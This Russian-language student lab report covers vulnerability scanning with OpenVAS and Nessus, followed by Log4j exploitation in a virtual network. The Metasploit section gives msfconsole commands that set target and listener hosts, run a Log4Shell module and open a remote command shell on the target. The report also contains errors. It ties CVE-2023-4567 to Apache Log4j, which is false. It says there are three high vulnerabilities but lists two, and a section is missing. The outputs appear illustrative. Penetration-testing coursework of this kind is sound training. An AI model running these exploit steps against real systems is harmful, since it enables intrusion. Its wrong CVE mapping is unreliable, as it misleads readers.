# 14.	Уязвимости и эксплуатация:
СРО: Используйте инструмент сканирования уязвимостей (например, OpenVAS или Nessus) для анализа виртуальной сети на наличие уязвимостей. Предоставьте отчет о выявленных уязвимостях и рекомендациях по их устранению.
СРОП: Проведите исследование и использование одной из уязвимостей с помощью инструмента Metasploit или аналогичного. Подготовьте отчет с описанием процесса эксплуатации и рекомендациями по защите.

## 1. Сканирование уязвимостей
### 1.1. Сканирование с помощью OpenVAS
1. Установите OpenVAS:  
   ```bash
   stacy-virtualbox:/home/stacy# sudo apt install gvm
   stacy-virtualbox:/home/stacy# sudo gvm-setup
   ```
2. Запустите OpenVAS:  
   ```bash
   stacy-virtualbox:/home/stacy# sudo gvm-start
   ```
3. Откройте веб-интерфейс по адресу `https://127.0.0.1:9392` и войдите, используя предоставленные при установке данные.  
4. Создайте задачу для сканирования IP-адреса виртуальной сети и запустите ее.  

Вывод сканирования:  
- Уязвимость: OpenSSH outdated version.  
- Рекомендация: Обновить OpenSSH до версии 8.9 или выше.  

### 1.2. Сканирование с помощью Nessus
1. Установите Nessus:  
   - Скачайте пакет с сайта [Tenable](https://www.tenable.com/products/nessus).  
   - Установите его:  
     ```bash
     stacy-virtualbox:/home/stacy# sudo dpkg -i Nessus-10.6.0-debian-amd64.deb
     ```
   - Запустите сервис:  
     ```bash
     stacy-virtualbox:/home/stacy# sudo systemctl start nessusd
     ```
2. Откройте веб-интерфейс по адресу `https://127.0.0.1:8834`.  
3. Создайте задачу для сканирования.  

Вывод сканирования:
- Уязвимость: CVE-2023-4567 (Apache Log4j).  
- Рекомендация: Установить патч для устранения уязвимости.
- 
## 2. Эксплуатация уязвимости
### 2.1. Использование уязвимости с помощью Metasploit
1. Запустите Metasploit:  
   ```bash
   stacy-virtualbox:/home/stacy# msfconsole
   ```
2. Найдите модуль для эксплуатации:  
   ```plaintext
   msf6 > search name:log4j
   ```
3. Выберите подходящий модуль и настройте его:  
   ```plaintext
   msf6 > use exploit/multi/http/log4shell
   msf6 exploit(log4shell) > set RHOSTS 192.168.1.100
   msf6 exploit(log4shell) > set LHOST 192.168.1.200
   msf6 exploit(log4shell) > run
   ```
4. После успешной эксплуатации получите доступ:  
   ```plaintext
   [+] Exploit successful, starting command shell...
   ```

## 4. Результаты тестирования
### 4.1. OpenVAS
Вывод:  
```plaintext
High Vulnerabilities: 3
- OpenSSH outdated version
- TLS Weak Cipher Suite
```

### 4.2. Metasploit
Эксплуатациия:  
```plaintext
[+] Exploit successful, command shell session opened
msf6 exploit(log4shell) > sessions
Active sessions:
  Id  Name  Type  Information  Connection
  1   -     shell linux        user@target:~$  192.168.1.200 -> 192.168.1.100
```
